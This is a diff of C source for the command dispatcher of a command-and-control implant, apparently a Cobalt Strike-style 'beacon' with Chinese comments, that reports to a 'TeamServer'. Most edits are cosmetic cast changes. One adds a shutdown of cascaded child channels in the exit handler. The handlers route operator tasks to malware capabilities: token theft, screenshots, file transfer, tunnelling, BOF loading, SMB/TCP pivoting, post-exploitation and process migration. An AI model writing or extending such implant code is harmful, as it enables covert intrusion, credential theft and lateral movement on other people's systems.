@@ -33,12 +33,13 @@ static PacketList CommandUnknown(UINT32 command_id)
     return CommandSingle(msg);
 }
 
+/* 以下 HandleXxx 函数只做分发适配：解析少量公共参数并调用具体命令实现。 */
 static PacketList HandleSleep(BeaconContext* ctx, UINT32 task_id,
                               UINT32 command_id, Parser* p)
 {
     ByteBuf msg;
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
 
     if (ParserU32(p) == 0) {
         return CommandSingle(BbFromText("sleep requires at least 1 argument"));
@@ -57,10 +58,14 @@ static PacketList HandleExit(BeaconContext* ctx, UINT32 task_id,
                              UINT32 command_id, Parser* p)
 {
     PacketList out;
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
+
+    /* 同步关闭所有级联子通道并入队 CASCADE_DEAD 通知，必须在设置
+     * should_exit 之前完成，确保 Dead 包能在本次 flushCascade +
+     * flushOutbox 周期内发往 TeamServer，而不是在主循环退出后才生成。 */
+    CascadeShutdownAll(&ctx->cascade);
 
     PlistInit(&out);
     out.should_exit = 1;
@@ -83,281 +88,281 @@ static PacketList HandlePowerShell(BeaconContext* ctx, UINT32 task_id,
 static PacketList HandleCd(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandCd(p));
 }
 
 static PacketList HandleLs(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandLs(p));
 }
 
 static PacketList HandlePwd(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
     return CommandSingle(CommandPwd());
 }
 
 static PacketList HandleCat(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandCat(p));
 }
 
 static PacketList HandleMkdir(BeaconContext* ctx, UINT32 task_id,
                               UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandMkdir(p));
 }
 
 static PacketList HandleRm(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandRm(p));
 }
 
 static PacketList HandleMv(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandMv(p));
 }
 
 static PacketList HandleCp(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandCp(p));
 }
 
 static PacketList HandleDownload(BeaconContext* ctx, UINT32 task_id,
                                  UINT32 command_id, Parser* p)
 {
-    (void)command_id;
+    (VOID)command_id;
     return TransferHandleDownload(ctx, task_id, p);
 }
 
 static PacketList HandleUpload(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
 {
-    (void)command_id;
+    (VOID)command_id;
     return CommandSingle(TransferHandleUpload(ctx, task_id, p));
 }
 
 static PacketList HandlePs(BeaconContext* ctx, UINT32 task_id,
                            UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
     return CommandSingle(CommandPs());
 }
 
 static PacketList HandleKill(BeaconContext* ctx, UINT32 task_id,
                              UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandKill(p));
 }
 
 static PacketList HandleStealToken(BeaconContext* ctx, UINT32 task_id,
                                    UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandStealToken(p));
 }
 
 static PacketList HandleWhoami(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
     return CommandSingle(CommandWhoami(ctx));
 }
 
 static PacketList HandleNetinfo(BeaconContext* ctx, UINT32 task_id,
                                 UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
     return CommandSingle(CommandNetinfo());
 }
 
 static PacketList HandleNetstat(BeaconContext* ctx, UINT32 task_id,
                                 UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
     return CommandSingle(CommandNetstat());
 }
 
 static PacketList HandleFilebrowser(BeaconContext* ctx, UINT32 task_id,
                                     UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandFilebrowser(p));
 }
 
 static PacketList HandleSetattr(BeaconContext* ctx, UINT32 task_id,
                                 UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandSetattr(p));
 }
 
 static PacketList HandleZip(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandZip(p));
 }
 
 static PacketList HandleJobs(BeaconContext* ctx, UINT32 task_id,
                              UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
-    (void)p;
+    (VOID)task_id;
+    (VOID)command_id;
+    (VOID)p;
     return CommandSingle(CommandJobs(ctx));
 }
 
 static PacketList HandleKillJob(BeaconContext* ctx, UINT32 task_id,
                                 UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandKillJob(ctx, p));
 }
 
 static PacketList HandleScreenshot(BeaconContext* ctx, UINT32 task_id,
                                    UINT32 command_id, Parser* p)
 {
-    (void)ctx;
-    (void)task_id;
-    (void)command_id;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CommandScreenshot(p));
 }
 
 static PacketList HandleTunnelStart(BeaconContext* ctx, UINT32 task_id,
                                     UINT32 command_id, Parser* p)
 {
-    (void)command_id;
+    (VOID)command_id;
     return TunnelHandleStart(ctx, task_id, p);
 }
 
 static PacketList HandleTunnelControl(BeaconContext* ctx, UINT32 task_id,
                                       UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return TunnelHandleControl(&ctx->tunnels, p, NULL);
 }
 
 static PacketList HandleTunnelData(BeaconContext* ctx, UINT32 task_id,
                                    UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return TunnelHandleData(&ctx->tunnels, p);
 }
 
 static PacketList HandleTunnelClose(BeaconContext* ctx, UINT32 task_id,
                                     UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return TunnelHandleControl(&ctx->tunnels, p, "close");
 }
 
 static PacketList HandleBof(BeaconContext* ctx, UINT32 task_id,
                             UINT32 command_id, Parser* p)
 {
-    (void)command_id;
+    (VOID)command_id;
     return CommandBofHandle(ctx, task_id, p);
 }
 
 static PacketList HandleCascadeConnectTcp(BeaconContext* ctx, UINT32 task_id,
                                           UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CascadeHandleConnectTcp(ctx, p));
 }
 
 static PacketList HandleCascadeLinkSmb(BeaconContext* ctx, UINT32 task_id,
                                        UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CascadeHandleLinkSmb(ctx, p));
 }
 
 static PacketList HandleCascadeRoute(BeaconContext* ctx, UINT32 task_id,
                                      UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CascadeHandleRoute(ctx, p));
 }
 
 static PacketList HandleCascadeClose(BeaconContext* ctx, UINT32 task_id,
                                      UINT32 command_id, Parser* p)
 {
-    (void)task_id;
-    (void)command_id;
+    (VOID)task_id;
+    (VOID)command_id;
     return CommandSingle(CascadeHandleClose(ctx, p));
 }
 
 static PacketList HandlePostEx(BeaconContext* ctx, UINT32 task_id,
                                UINT32 command_id, Parser* p)
 {
-    (void)command_id;
+    (VOID)command_id;
     return CommandSingle(PostExHandle(ctx, task_id, p));
 }
 
 static PacketList HandleMigrate(BeaconContext* ctx, UINT32 task_id,
                                 UINT32 command_id, Parser* p)
 {
-    (void)command_id;
+    (VOID)command_id;
     return CommandSingle(MigrateHandle(ctx, task_id, p));
 }
 
